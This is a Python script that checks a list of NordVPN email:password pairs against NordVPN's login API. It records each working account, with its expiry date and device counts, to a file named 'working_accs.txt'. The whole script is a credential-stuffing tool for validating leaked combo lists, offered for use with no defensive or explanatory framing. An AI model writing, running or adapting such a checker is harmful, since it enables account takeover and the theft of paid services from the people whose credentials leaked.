import asyncio
import re
from typing import List, Optional

import aiohttp


async def get_nord_token(username: str, password: str) -> Optional["str"]:
    """Fetch the token of an account."""
    data = {"username": username, "password": password}
    url = "https://api.nordvpn.com/v1/users/tokens"
    async with aiohttp.ClientSession() as s:
        async with s.post(url, data=data) as r:
            try:
                r_json = await r.json()
                return r_json.get("token", None)
            except Exception:
                r_text = await r.text()
                print(r_text)
                return None


async def get_nord_acc_info(token: str) -> dict:
    """Get extra info about an account."""
    url = "https://api.nordvpn.com/user/databytoken"
    headers = {"nToken": token}
    async with aiohttp.ClientSession() as s:
        async with s.get(url, headers=headers) as r:
            return await r.json()


def parse_nord_creds(filename: str) -> List[tuple]:
    """Parse a .txt file with nord credentials."""
    REG = re.compile(r"([A-Za-z0-9@#$%^&+=_.]*@[\w.]*):([A-Za-z0-9@#$%^&+=]*)")
    with open("nordvpnlist.txt", "r") as f:
        text = f.read()
    matches = REG.findall(text)
    return list(set(matches))


async def process_nord_cred_list(creds: List[tuple]) -> None:
    """Process the list of credentials."""
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(2)
    tasks = [process_nord_cred(cred, lock, sem) for cred in creds]
    await asyncio.gather(*tasks)


async def process_nord_cred(cred: tuple, lock, sem) -> None:
    """Process each credential and save to file."""
    async with sem:
        token = await get_nord_token(*cred)
        if token:
            info = await get_nord_acc_info(token)
            async with lock:
                with open("working_accs.txt", "a") as f:
                    cdev = info["devices"]["current"]
                    mdev = info["devices"]["max"]
                    einfo = info["expires"]
                    cout = f"{cred[0]}:{cred[1]} {einfo} {cdev}/{mdev}\n"
                    f.write(cout)
                    print(cout)


async def main():
    """Run main function."""
    creds = parse_nord_creds("nordvpnlist.txt")
    await process_nord_cred_list(creds)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
